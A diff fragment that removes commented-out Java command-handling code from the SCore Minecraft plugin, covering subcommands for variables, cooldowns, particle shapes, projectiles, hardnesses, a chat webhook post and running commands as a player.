-            //            }
-            //        } else
-            //            sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid argument! Usage: /score &8[ &7" + StringJoiner.join(commands, " &c| &7") + " &8]"));
-            //
-            //        return true;
-            //    }
-            //
-            //    /**
-            //     * Runs the command for the given {@link CommandSender}.
-            //     *
-            //     * @param sender   the {@link CommandSender} running the command.
-            //     * @param command  the command that was entered.
-            //     * @param fullArgs the passed command arguments.
-            //     */
-            //    public void runCommand(final CommandSender sender, final String command, final String[] fullArgs) {
-            //        final String[] args;
-            //
-            //        if (fullArgs.length > 1) {
-            //            args = new String[fullArgs.length - 1];
-            //
-            //            for (int i = 0; i < fullArgs.length; i++)
-            //                if (i != 0)
-            //                    args[i - 1] = fullArgs[i];
-            //        } else
-            //            args = new String[0];
-            //
-            //        Player player = null;
-            //
-            //        if (sender instanceof Player) {
-            //            player = (Player) sender;
-            //
-            //            if (!(player.hasPermission("score.cmd." + command) || player.hasPermission("score.cmds") || player.hasPermission("score.*"))) {
-            //                player.sendMessage(StringConverter.coloredString("&4[SCore] &cYou don't have the permission to execute this command: &6score.cmd." + command + "&c."));
-            //
-            //                return;
-            //            }
-            //        }
-            //
-            //        switch (command.toLowerCase()) {
-            //            case "no-translated":
-            //                SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cNo translated text sent in your console. &7(You can send it to Ssomar in the suggestions channel on the discord).");
-            //                Utils.sendConsoleFlatMsg(SCore.plugin, FeatureSettingsSCore.getAllNonTranslated());
-            //                break;
-            //            case "clear":
-            //                ClearCommand.clearCmd(SCore.plugin, sender, args);
-            //                break;
-            //            case "cooldowns":
-            //                if (args.length >= 1) {
-            //                    switch (args[0]) {
-            //                        case "clear":
-            //                            if (args.length < 2) {
-            //                                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid argument! Usage: /score cooldowns clear &7cooldownId"));
-            //                                return;
-            //                            }
-            //                            String cooldownId = args[1];
-            //                            UUID uuid = null;
-            //                            if (args.length >= 3) {
-            //                                try {
-            //                                    uuid = UUID.fromString(args[2]);
-            //                                } catch (final Exception e) {
-            //                                    try {
-            //                                        uuid = Bukkit.getPlayer(args[2]).getUniqueId();
-            //                                    } catch (final Exception e2) {
-            //                                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid UUID or player name : &6" + args[2]));
-            //                                    }
-            //                                }
-            //                            }
-            //                            CooldownsManager.getInstance().clearCooldown(cooldownId, uuid);
-            //                            sender.sendMessage(StringConverter.coloredString("&2[SCore] &aCooldown &e" + cooldownId + " &acleared!"));
-            //                            break;
-            //                    }
-            //                } else {
-            //                    CooldownsManager.getInstance().printInfo();
-            //                    sender.sendMessage(StringConverter.coloredString("&2[SCore] &aCooldowns printed in console!"));
-            //                }
-            //                break;
-            //            case "variables":
-            //                if (args.length >= 1) {
-            //                    if (args[0].equalsIgnoreCase("info")) {
-            //                        if (args.length >= 2) {
-            //                            final Optional<Variable> var = VariablesManager.getInstance().getVariable(args[1]);
-            //
-            //                            if (var.isPresent())
-            //                                SendMessage.sendMessageFinal(sender, var.get().getValuesStr(), false);
-            //                            else
-            //                                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cVariable (&6" + args[1] + ") &cnot found!"));
-            //                        }
-            //                    } else if (args[0].equalsIgnoreCase("list"))
-            //                        sender.sendMessage(VariablesManager.getInstance().getVariableIdsListStr());
-            //                    else if (args[0].equalsIgnoreCase("set")
-            //                            || args[0].equalsIgnoreCase("modification")
-            //                            || args[0].equalsIgnoreCase("list-add")
-            //                            || args[0].equalsIgnoreCase("list-remove")
-            //                            || args[0].equalsIgnoreCase("clear")) {
-            //                        int argIndex = 0;
-            //
-            //                        final String modifType = args[argIndex];
-            //                        argIndex++;
-            //
-            //                        final String forType = args[argIndex];
-            //                        argIndex++;
-            //
-            //                        final String varName = args[argIndex];
-            //                        argIndex++;
-            //
-            //                        String value = "";
-            //
-            //                        // No value is needed for remove.
-            //                        if (!args[0].equalsIgnoreCase("list-remove") && !args[0].equalsIgnoreCase("clear")) {
-            //                            if (args.length > argIndex) value = args[argIndex];
-            //                            else {
-            //                                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid value!"));
-            //                                return;
-            //                            }
-            //
-            //                            argIndex++;
-            //                        }
-            //
-            //                        Optional<OfflinePlayer> optPlayer = Optional.empty();
-            //                        String playerStr = "";
-            //
-            //                        if (args.length >= argIndex + 1 && forType.equalsIgnoreCase("player"))
-            //                            try {
-            //                                playerStr = args[argIndex];
-            //                                optPlayer = Optional.of(Bukkit.getOfflinePlayer(args[argIndex]));
-            //                            } catch (final Exception e) {
-            //                                e.printStackTrace();
-            //                            }
-            //
-            //                        Optional<Integer> indexOpt = Optional.empty();
-            //
-            //                        if (args.length >= argIndex + 1 && (modifType.equalsIgnoreCase("list-add") || modifType.equalsIgnoreCase("list-remove")))
-            //                            for (int i = argIndex; i < args.length; i++)
-            //                                if (args[i].contains("index:"))
-            //                                    try {
-            //                                        indexOpt = Optional.of(Integer.parseInt(args[i].replace("index:", "")));
-            //                                    } catch (final NumberFormatException e) {
-            //                                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid index!"));
-            //                                    }
-            //
-            //                        Optional<String> valueOpt = Optional.empty();
-            //
-            //                        if (args.length >= argIndex + 1 && (modifType.equalsIgnoreCase("list-remove")))
-            //                            for (int i = argIndex; i < args.length; i++)
-            //                                if (args[i].contains("value:"))
-            //                                    try {
-            //                                        valueOpt = Optional.of(args[i].replace("value:", ""));
-            //                                    } catch (final Exception e) {
-            //                                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid value!"));
-            //                                    }
-            //
-            //                        final Optional<Variable> variableOpt = VariablesManager.getInstance().getVariable(varName);
-            //
-            //                        if (variableOpt.isPresent()) {
-            //                            if (modifType.equalsIgnoreCase("set")) {
-            //                                final Optional<String> errorOpt = variableOpt.get().setValue(optPlayer, value);
-            //
-            //                                if (errorOpt.isPresent())
-            //                                    sender.sendMessage(errorOpt.get());
-            //                                else
-            //                                    SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_VALUE_SET));
-            //                            } else if (modifType.equalsIgnoreCase("modification")) {
-            //                                final Optional<String> errorOpt = variableOpt.get().modifValue(optPlayer, value);
-            //
-            //                                if (errorOpt.isPresent())
-            //                                    sender.sendMessage(errorOpt.get());
-            //                                else
-            //                                    SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_VALUE_SET));
-            //                            } else if (modifType.equalsIgnoreCase("list-add")) {
-            //                                final Optional<String> errorOpt = variableOpt.get().addValue(optPlayer, value, indexOpt);
-            //
-            //                                if (errorOpt.isPresent())
-            //                                    sender.sendMessage(errorOpt.get());
-            //                                else
-            //                                    SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_VALUE_SET));
-            //                            } else if (modifType.equalsIgnoreCase("list-remove")) {
-            //                                final Optional<String> errorOpt = variableOpt.get().removeValue(optPlayer, indexOpt, valueOpt);
-            //
-            //                                if (errorOpt.isPresent())
-            //                                    sender.sendMessage(errorOpt.get());
-            //                                else
-            //                                    SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_VALUE_SET));
-            //                            } else if (modifType.equalsIgnoreCase("clear")) {
-            //                                final Optional<String> errorOpt;
-            //
-            //                                if (playerStr.equalsIgnoreCase("all"))
-            //                                    errorOpt = variableOpt.get().clearAllValues();
-            //                                else errorOpt = variableOpt.get().clearValue(optPlayer);
-            //
-            //                                if (errorOpt.isPresent())
-            //                                    sender.sendMessage(errorOpt.get());
-            //                                else
-            //                                    SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_VALUE_SET));
-            //                            }
-            //
-            //                            VariablesManager.getInstance().updateLoadedMySQL(variableOpt.get().getId(), VariablesManager.MODE.EXPORT);
-            //                        } else
-            //                            sender.sendMessage(StringConverter.coloredString("&4[SCore] &cVariable (&6" + args[1] + ") &cnot found!"));
-            //                    } else if (args[0].equalsIgnoreCase("set-default")) {
-            //                        int argIndex = 0;
-            //
-            //                        final String modifType = args[argIndex];
-            //                        argIndex++;
-            //
-            //                        final String varName = args[argIndex];
-            //                        argIndex++;
-            //
-            //                        String value = args[argIndex];
-            //
-            //                        final Optional<Variable> variableOpt = VariablesManager.getInstance().getVariable(varName);
-            //
-            //                        if (variableOpt.isPresent()) {
-            //                            if (modifType.equalsIgnoreCase("set-default")) {
-            //                                variableOpt.get().getDefaultValue().setValue(value);
-            //
-            //                                SendMessage.sendMessageNoPlch(sender, MessageMain.getInstance().getMessage(SCore.plugin, Message.VARIABLE_DEFAULT_VALUE_SET));
-            //                            }
-            //
-            //                            VariablesManager.getInstance().updateLoadedMySQL(variableOpt.get().getId(), VariablesManager.MODE.EXPORT);
-            //                        } else
-            //                            sender.sendMessage(StringConverter.coloredString("&4[SCore] &cVariable (&6" + args[1] + ") &cnot found!"));
-            //                    }
-            //                } else if (player != null)
-            //                    NewSObjectsManagerEditor.getInstance().startEditing(player, new VariablesEditor());
-            //
-            //                break;
-            //            case "particles":
-            //                String shapeName = "";
-            //                String targetStr = "";
-            //                String locationStr = "";
-            //                Entity targetEntity = null;
-            //
-            //                if (player != null)
-            //                    targetEntity = player;
-            //
-            //                Location targetLocation = null;
-            //
-            //                for (final String arg : args) {
-            //                    if (arg.contains("shape:"))
-            //                        try {
-            //                            shapeName = arg.split(":")[1];
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //                    else if (arg.contains("target:"))
-            //                        try {
-            //                            targetStr = arg.split(":")[1];
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //                    else if (arg.contains("location:"))
-            //                        try {
-            //                            locationStr = arg.split(":")[1];
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //                }
-            //                if (!targetStr.isEmpty())
-            //                    try {
-            //                        targetEntity = Bukkit.getEntity(UUID.fromString(targetStr));
-            //                    } catch (final Exception e) {
-            //                        SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cInvalid target (" + targetStr + ") for the command &6/score particles&c.");
-            //                        return;
-            //                    }
-            //
-            //                if (targetEntity != null)
-            //                    targetLocation = targetEntity.getLocation();
-            //
-            //                if (!locationStr.isEmpty())
-            //                    try {
-            //                        final String[] locStr = locationStr.split(",");
-            //                        targetLocation = new Location(AllWorldManager.getWorld(locStr[0]).get(), Double.parseDouble(locStr[1]), Double.parseDouble(locStr[2]), Double.parseDouble(locStr[3]));
-            //                        targetEntity = null;
-            //                    } catch (final Exception e) {
-            //                        SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cInvalid location for the command /score particles.");
-            //
-            //                        return;
-            //                    }
-            //
-            //                final Optional<Shape> shapeOpt = ShapesManager.getInstance().getShape(shapeName);
-            //
-            //                if (shapeOpt.isPresent()) {
-            //                    final Shape shape = shapeOpt.get();
-            //
-            //                    shape.getParameters().load(args, targetEntity, targetLocation);
-            //                    shape.run(shape.getParameters(), targetEntity);
-            //
-            //                    SendMessage.sendMessageNoPlch(sender, "&2[SCore] &aShape executed!");
-            //                } else {
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cInvalid shape for the command &6/score particles&c.");
-            //
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cShapes: &7" + StringJoiner.join(ShapesManager.getInstance().getShapesNames(), "&8, &7") + "&c.");
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cExample: &6/score particles &eshape:blackhole&c.");
-            //                }
-            //
-            //                break;
-            //            case "particles-info":
-            //                String shapeName2 = "";
-            //
-            //                for (final String arg : args)
-            //                    if (arg.contains("shape:"))
-            //                        try {
-            //                            shapeName2 = arg.split(":")[1];
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //
-            //                final Optional<Shape> shapeOpt2 = ShapesManager.getInstance().getShape(shapeName2);
-            //
-            //                if (shapeOpt2.isPresent()) {
-            //                    final Shape shape = shapeOpt2.get();
-            //                    SendMessage.sendMessageNoPlch(sender, "&2[SCore] &aYou should configure the following parameters for shape &e" + shape.getName() + "&a:");
-            //
-            //                    final StringBuilder parametersList = new StringBuilder();
-            //                    parametersList.append("&6particle &7type &eclass org.bukkit.Particle\n");
-            //
-            //                    for (final Parameter<?> parameter : shape.getParameters())
-            //                        parametersList
-            //                                .append("&6")
-            //                                .append(parameter.getName())
-            //                                .append(" &7type &e")
-            //                                .append(parameter.getValue().getClass())
-            //                                .append("\n");
-            //
-            //                    parametersList.append("&7&oFor more info about this shape check &ethe wiki\n\n");
-            //                    SendMessage.sendMessageNoPlch(sender, parametersList.toString());
-            //
-            //                    final TextComponent link = new TextComponent(StringConverter.coloredString(CenteredMessage.convertIntoCenteredMessage("&a&l[CLICK HERE]")));
-            //                    link.setClickEvent(new ClickEvent(ClickEvent.Action.OPEN_URL, "https://docs.ssomar.com/tools-for-all-plugins-score/score-particles"));
-            //
-            //                    sender.spigot().sendMessage(link);
-            //                    sender.sendMessage(" ");
-            //
-            //                    final Optional<String> exampleOpt = ShapesExamples.getInstance().getExample(shape.getName());
-            //
-            //                    if (!exampleOpt.isPresent())
-            //                        SendMessage.sendMessageNoPlch(sender, CenteredMessage.convertIntoCenteredMessage("&cNO EXAMPLE AVAILABLE FOR THIS SHAPE"));
-            //                    else {
-            //                        final TextComponent copy = new TextComponent(StringConverter.coloredString(CenteredMessage.convertIntoCenteredMessage("&e&l[CLICK HERE TO COPY THE EXAMPLE]")));
-            //                        copy.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, exampleOpt.get()));
-            //
-            //                        sender.spigot().sendMessage(copy);
-            //                    }
-            //
-            //
-            //                } else {
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cInvalid shape for the command &6/score particles-info&c.");
-            //
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cShapes: &7" + StringJoiner.join(ShapesManager.getInstance().getShapesNames(), "&8, &7") + "&c.");
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cExample: &6/score particles-info &eshape:blackhole&c.");
-            //                }
-            //                break;
-            //            case "reload":
-            //                this.main.onReload();
-            //
-            //                this.sm.sendMessage(sender, ChatColor.GREEN + "SCore has been reloaded.");
-            //                Utils.sendConsoleMsg("SCore reloaded!");
-            //
-            //                break;
-            //            case "inspect-loop":
-            //                final Map<SActivator, Integer> loops = LoopManager.getInstance().getLoopActivators();
-            //
-            //                this.sm.sendMessage(sender, " ");
-            //                this.sm.sendMessage(sender, "&8==== &7SCore contains &e" + loops.size() + " &7loop(s) &8====");
-            //                this.sm.sendMessage(sender, "&7&o(The loop of ExecutableItems requires more performance when there are many players)");
-            //                this.sm.sendMessage(sender, " ");
-            //
-            //                for (final SActivator sAct : loops.keySet()) {
-            //                    LoopFeatures loop = null;
-            //
-            //                    for (final Object feature : sAct.getFeatures())
-            //                        if (feature instanceof LoopFeatures)
-            //                            loop = (LoopFeatures) feature;
-            //
-            //                    if (loop == null)
-            //                        continue;
-            //
-            //                    int delay = loop.getDelay().getValue().get();
-            //
-            //                    if (!loop.getDelayInTick().getValue())
-            //                        delay *= 20;
-            //
-            //                    if (SCore.hasExecutableItems && sAct instanceof ActivatorEIFeature)
-            //                        this.sm.sendMessage(sender, "&bEI LOOP > &7item: &e" + sAct.getParentObjectId() + " &7delay: &e" + delay + " &7(in ticks)");
-            //                    else if (SCore.hasExecutableBlocks && sAct instanceof ActivatorEBFeature)
-            //                        this.sm.sendMessage(sender, "&aEB LOOP > &7block: &e" + sAct.getParentObjectId() + " &7delay: &e" + delay + " &7(in ticks)");
-            //                    else if (SCore.hasExecutableEvents && sAct instanceof ActivatorEEFeature)
-            //                        this.sm.sendMessage(sender, "&6EE LOOP > &7event: &e" + sAct.getParentObjectId() + " &7delay: &e" + delay + " &7(in ticks)");
-            //
-            //                }
-            //
-            //                this.sm.sendMessage(sender, " ");
-            //                break;
-            //            case "projectiles":
-            //                if (player != null)
-            //                    NewSObjectsManagerEditor.getInstance().startEditing(player, new SProjectilesEditor());
-            //
-            //                break;
-            //            case "projectiles-create":
-            //                if (player != null) {
-            //                    if (args.length >= 1) {
-            //                        if (SProjectilesManager.getInstance().getAllObjects().contains(args[0])) {
-            //                            player.sendMessage(StringConverter.coloredString("&4[SCore] &cThis ID already exists! Retype &6/score projectiles-create ID &7&o(ID is the ID you want for your new projectile)&c."));
-            //
-            //                            break;
-            //                        }
-            //
-            //                        final SProjectile sProjectile = new SProjectile(args[0], "plugins/SCore/projectiles/" + args[0] + ".yml");
-            //
-            //                        sProjectile.save();
-            //                        SProjectilesManager.getInstance().addLoadedObject(sProjectile);
-            //                        sProjectile.openEditor(player);
-            //
-            //                        break;
-            //                    }
-            //
-            //                    player.sendMessage(StringConverter.coloredString("&2[SCore] &aTo create a new projectile, type &e/score projectiles-create ID &7&o(ID is the ID you want for your new projectile)&a."));
-            //                }
-            //
-            //                break;
-            //            case "projectiles-delete":
-            //                if (args.length >= 2) {
-            //                    if (!args[1].equalsIgnoreCase("confirm")) {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score projectiles-delete {projID} confirm&c."));
-            //
-            //                        return;
-            //                    }
-            //
-            //                    final Optional<SProjectile> sProjectileOpt = SProjectilesManager.getInstance().getLoadedObjectWithID(args[0]);
-            //
-            //                    if (sProjectileOpt.isPresent()) {
-            //                        SProjectilesManager.getInstance().deleteObject(args[0]);
-            //
-            //                        sender.sendMessage(StringConverter.coloredString("&2[SCore] &aProjectile file (&e" + args[0] + ".yml&a) deleted!"));
-            //                        break;
-            //                    }
-            //
-            //                    sender.sendMessage(StringConverter.coloredString("&4[SCore] &cProjectile file (&6" + args[0] + ".yml&c) not found!"));
-            //                    break;
-            //                }
-            //
-            //                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score projectiles-delete {projID} confirm&c."));
-            //                break;
-            //            case "hardnesses":
-            //                if (player != null)
-            //                    NewSObjectsManagerEditor.getInstance().startEditing(player, new HardnessesEditor());
-            //
-            //                break;
-            //            case "hardnesses-create":
-            //                if (player != null) {
-            //                    if (args.length >= 1) {
-            //                        if (HardnessesManager.getInstance().getAllObjects().contains(args[0])) {
-            //                            player.sendMessage(StringConverter.coloredString("&4[SCore] &cThis ID already exists! Retype &6/score hardnesses-create ID &7&o(ID is the ID you want for your new hardness)&c."));
-            //
-            //                            break;
-            //                        }
-            //
-            //                        final Hardness hard = new Hardness(args[0], "plugins/SCore/hardnesses/" + args[0] + ".yml");
-            //
-            //                        hard.save();
-            //                        HardnessesManager.getInstance().addLoadedObject(hard);
-            //                        hard.openEditor(player);
-            //
-            //                        break;
-            //                    }
-            //
-            //                    player.sendMessage(StringConverter.coloredString("&2[SCore] &aTo create a new hardness, type &e/score hardnesses-create ID &7&o(ID is the ID you want for your new hardness)&a."));
-            //                }
-            //
-            //                break;
-            //            case "hardnesses-delete":
-            //                if (args.length >= 2) {
-            //                    if (!args[1].equalsIgnoreCase("confirm")) {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score hardnesses-delete {hardID} confirm&c."));
-            //
-            //                        return;
-            //                    }
-            //
-            //                    final Optional<Hardness> hardnessOpt = HardnessesManager.getInstance().getLoadedObjectWithID(args[0]);
-            //
-            //                    if (hardnessOpt.isPresent()) {
-            //                        HardnessesManager.getInstance().deleteObject(args[0]);
-            //
-            //                        sender.sendMessage(StringConverter.coloredString("&2[SCore] &aHardness file (&e" + args[0] + ".yml&a) deleted!"));
-            //                        break;
-            //                    }
-            //
-            //                    sender.sendMessage(StringConverter.coloredString("&4[SCore] &cHardness file (&6" + args[0] + ".yml&c) not found!"));
-            //                    break;
-            //                }
-            //
-            //                sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score hardnesses-delete {hardID} confirm&c."));
-            //                break;
-            //            case "variables-create":
-            //                if (player != null) {
-            //                    if (args.length >= 1) {
-            //                        if (VariablesManager.getInstance().getAllObjects().contains(args[0])) {
-            //                            player.sendMessage(StringConverter.coloredString("&4[SCore] &cThis ID already exists! Retype &6/score variables-create ID &7&o(ID is the ID you want for your new variable)&c."));
-            //
-            //                            break;
-            //                        }
-            //
-            //                        final Variable variable = new Variable(args[0], "plugins/SCore/variables/" + args[0] + ".yml");
-            //
-            //                        variable.save();
-            //                        VariablesManager.getInstance().addLoadedObject(variable);
-            //                        variable.openEditor(player);
-            //
-            //                        break;
-            //                    }
-            //
-            //                    player.sendMessage(StringConverter.coloredString("&2[SCore] &aTo create a new variable, type &e/score variables-create ID &7&o(ID is the ID you want for your new variable)&a."));
-            //                }
-            //
-            //                break;
-            //
-            //
-            //            case "webhook-----------------":
-            //                // Expect: /score webhook----------------- <url> <true|false> <message...>
-            //                if (args.length < 3) {
-            //                    sender.sendMessage(ChatColor.RED + "Usage: /score webhook----------------- <url> <true|false> <message...>");
-            //                    break;
-            //                }
-            //
-            //                String webhook-----------------Url = args[0];
-            //                boolean debug;
-            //                try {
-            //                    debug = Boolean.parseBoolean(args[1]);
-            //                } catch (Exception ex) {
-            //                    sender.sendMessage(ChatColor.RED + "Second argument must be true or false.");
-            //                    break;
-            //                }
-            //
-            //                // Build the message from the remaining arguments
-            //                StringBuilder sb = new StringBuilder();
-            //                for (int i = 2; i < args.length; i++) {
-            //                    sb.append(args[i]);
-            //                    if (i < args.length - 1) sb.append(" ");
-            //                }
-            //                String rawMessage = sb.toString();
-            //
-            //                if (debug) {
-            //                    sender.sendMessage("Sending webhook-----------------...");
-            //                }
-            //
-            //                // Escape for JSON
-            //                String escaped = rawMessage
-            //                        .replace("\\", "\\\\")
-            //                        .replace("\"", "\\\"")
-            //                        .replace("\n", "\\n")
-            //                        .replace("\r", "");
-            //                String jsonPayload = "{\"content\":\"" + escaped + "\"}";
-            //
-            //                // Perform HTTP POST asynchronously
-            //                Bukkit.getScheduler().runTaskAsynchronously(SCore.plugin, () -> {
-            //                    boolean success = false;
-            //                    try {
-            //                        URL url = new URL(webhook-----------------Url);
-            //                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            //                        conn.setRequestMethod("POST");
-            //                        conn.setRequestProperty("Content-Type", "application/json");
-            //                        conn.setDoOutput(true);
-            //
-            //                        byte[] body = jsonPayload.getBytes(StandardCharsets.UTF_8);
-            //                        conn.setFixedLengthStreamingMode(body.length);
-            //
-            //                        try (OutputStream os = conn.getOutputStream()) {
-            //                            os.write(body);
-            //                        }
-            //
-            //                        int responseCode = conn.getResponseCode();
-            //                        conn.disconnect();
-            //                        success = (responseCode >= 200 && responseCode < 300);
-            //                    } catch (Exception ex) {
-            //                        success = false;
-            //                    }
-            //
-            //                    if (debug) {
-            //                        boolean finalSuccess = success;
-            //                        Bukkit.getScheduler().runTask(SCore.plugin, () -> {
-            //                            if (finalSuccess) {
-            //                                sender.sendMessage("Webhook §asuccessfully sent.§r");
-            //                            } else {
-            //                                sender.sendMessage("Webhook §cunsuccessfully sent.§r");
-            //                            }
-            //                        });
-            //                    }
-            //                });
-            //                break;     
-            //                
-            //                
-            //            
-            //            case "variables-define":
-            //                try {
-            //                    if (args.length < 3) {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cCommand format: /score variables-define {var_id} {type} {for} [icon_material] [default_values...]"));
-            //                        return;
-            //                    }
-            //                    // Get default value, if it exists. list will not have this.
-            //                    String variablePath = "";
-            //                    if (args[0].contains(".")) {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cPlease, no \".\" in variable name."));
-            //                        return;
-            //                    } else {
-            //                        // No path specified, do as usual.
-            //                        variablePath = "plugins/SCore/variables/" + args[0] + ".yml";
-            //                    }
-            //                    Optional<Variable> varOpt = VariablesManager.getInstance().getVariable(args[0]);
-            //                    if (varOpt.isPresent()) return;
-            //                    final Variable variable = new Variable(args[0], variablePath);
-            //
-            //
-            //                    List<String> argList = new ArrayList<>(); // Default Value
-            //                    if (args.length > 4) {
-            //                        argList = Arrays.asList(Arrays.copyOfRange(args, 4, args.length)); // Remaining arguments as a list
-            //                    }
-            //                    String formattedArgs = String.join(" ", argList);
-            //
-            //                    // Type Check
-            //                    switch (args[1].toLowerCase()) {
-            //                        case "string":
-            //                            variable.getType().setValue(Optional.of(VariableType.STRING));
-            //                            break;
-            //                        case "list":
-            //                            variable.getType().setValue(Optional.of(VariableType.LIST));
-            //                            break;
-            //                        case "number":
-            //                            variable.getType().setValue(Optional.of(VariableType.NUMBER));
-            //                            break;
-            //                        default:
-            //                            sender.sendMessage(StringConverter.coloredString("&4[SCore] &cYou must pick between STRING, LIST, OR NUMBER for the type! You picked: " + args[1]));
-            //                            return;
-            //                    }
-            //
-            //                    if (args[2].equalsIgnoreCase("global"))
-            //                        variable.getForFeature().setValue(Optional.of(VariableForEnum.GLOBAL));
-            //                    else if (args[2].equalsIgnoreCase("player"))
-            //                        variable.getForFeature().setValue(Optional.of(VariableForEnum.PLAYER));
-            //                    else {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cYou must pick between PLAYER or GLOBAL for the scope!"));
-            //                        return;
-            //                    }
-            //
-            //
-            //                    //Icon Check
-            //                    if (args.length >= 4) {
-            //                        try {
-            //                            variable.getIcon().setValue(Optional.ofNullable(Material.getMaterial(args[3].toUpperCase())));
-            //                        } catch (Exception n) {
-            //                            sender.sendMessage(StringConverter.coloredString("&4[SCore] &cInvalid material \"" + args[3] + "\" Check https://hub.spigotmc.org/javadocs/bukkit/org/bukkit/Material.html"));
-            //                            return;
-            //                        }
-            //                    }
-            //
-            //                    // For non-lists, check if default value is specified. If yes, then set. Otherwise, leave empty.
-            //                    if (!args[1].equalsIgnoreCase("list") && !formattedArgs.isEmpty())
-            //                        variable.getDefaultValue().setValue(formattedArgs);
-            //
-            //
-            //                    File varFile = new File(variablePath);
-            //                    if (!varFile.getParentFile().exists()) {
-            //                        varFile.getParentFile().mkdirs();
-            //                    }
-            //                    if (!varFile.exists()) {
-            //                        varFile.createNewFile();
-            //                    }
-            //
-            //
-            //                    // Save to disk and load into the game
-            //                    variable.save();
-            //                    VariablesManager.getInstance().addLoadedObject(variable);
-            //
-            //
-            //                    // Success
-            //                    sender.sendMessage(StringConverter.coloredString("&2[SCore] &aSuccess defining variable: " + args[0]));
-            //
-            //                } catch (Exception e) {
-            //                    sender.sendMessage("&4[SCore] &cError defining variable: " + e.getMessage());
-            //                }
-            //                break;
-            //
-            //            case "variables-delete":
-            //                if (args.length >= 2) {
-            //                    if (!args[1].equalsIgnoreCase("confirm")) {
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score variables-delete {varID} confirm&c."));
-            //                        return;
-            //                    }
-            //
-            //                    final Optional<Variable> variableOpt = VariablesManager.getInstance().getLoadedObjectWithID(args[0]);
-            //
-            //                    if (variableOpt.isPresent()) {
-            //                        VariablesManager.getInstance().deleteObject(args[0]);
-            //                        VariablesManager.getInstance().deleteLoadedMYSQL(args[0]);
-            //
-            //                        sender.sendMessage(StringConverter.coloredString("&2[SCore] &aVariable file (&e" + args[0] + ".yml&a) deleted!"));
-            //                    } else
-            //                        sender.sendMessage(StringConverter.coloredString("&4[SCore] &cVariable file (&6" + args[0] + ".yml&c) not found!"));
-            //                } else
-            //                    sender.sendMessage(StringConverter.coloredString("&4[SCore] &cTo confirm deletion, type &6/score variables-delete {varID} confirm&c."));
-            //
-            //                break;
-            //            case "run-player-command":
-            //                Optional<Player> playerOpt = Optional.empty();
-            //                StringBuilder cmd = new StringBuilder();
-            //
-            //                for (final String arg : args)
-            //                    if (arg.startsWith("player:")) {
-            //                        String playerName = arg.replace("player:", "");
-            //                        playerName = StringPlaceholder.replacePlaceholderOfPAPI(playerName, null);
-            //
-            //                        try {
-            //                            playerOpt = Optional.ofNullable(Bukkit.getPlayer(UUID.fromString(playerName)));
-            //                        } catch (final Exception e) {
-            //                            playerOpt = Optional.ofNullable(Bukkit.getPlayer(playerName));
-            //                        }
-            //                    } else
-            //                        cmd.append(arg).append(" ");
-            //
-            //                if (!playerOpt.isPresent()) {
-            //                    SendMessage.sendMessageNoPlch(sender, "&4[SCore] &cError: &7&oYou must specify a player with &6player:PLAYER_NAME&7&o or &6player:PLAYER_UUID&c.");
-            //
-            //                    return;
-            //                }
-            //
-            //                cmd = new StringBuilder(cmd.toString().trim());
-            //
-            //                final ActionInfo info = new ActionInfo("run-player-command", new StringPlaceholder());
-            //                final UUID uuid = playerOpt.get().getUniqueId();
-            //
-            //                info.setLauncherUUID(uuid);
-            //                info.setReceiverUUID(uuid);
-            //
-            //                final StringPlaceholder sp = new StringPlaceholder();
-            //                sp.setPlayerPlcHldr(uuid);
-            //                info.setSp(sp);
-            //
-            //                final PlayerRunCommandsBuilder builder = new PlayerRunCommandsBuilder(Collections.singletonList(cmd.toString()), info);
-            //                CommandsExecutor.runCommands(builder);
-            //
-            //                break;
-            //            case "run-entity-command":
-            //                Optional<Entity> entityOptional = Optional.empty();
-            //                StringBuilder entityCmd = new StringBuilder();
-            //
-            //                for (final String arg : args)
-            //                    if (arg.startsWith("entity:")) {
-            //                        final String entityName = arg.replace("entity:", "");
-            //
-            //                        try {
-            //                            entityOptional = Optional.ofNullable(Bukkit.getEntity(UUID.fromString(entityName)));
-            //                        } catch (final Exception ignored) {
-            //                        }
-            //                    } else
-            //                        entityCmd.append(arg).append(" ");
-            //
-            //                if (!entityOptional.isPresent()) {
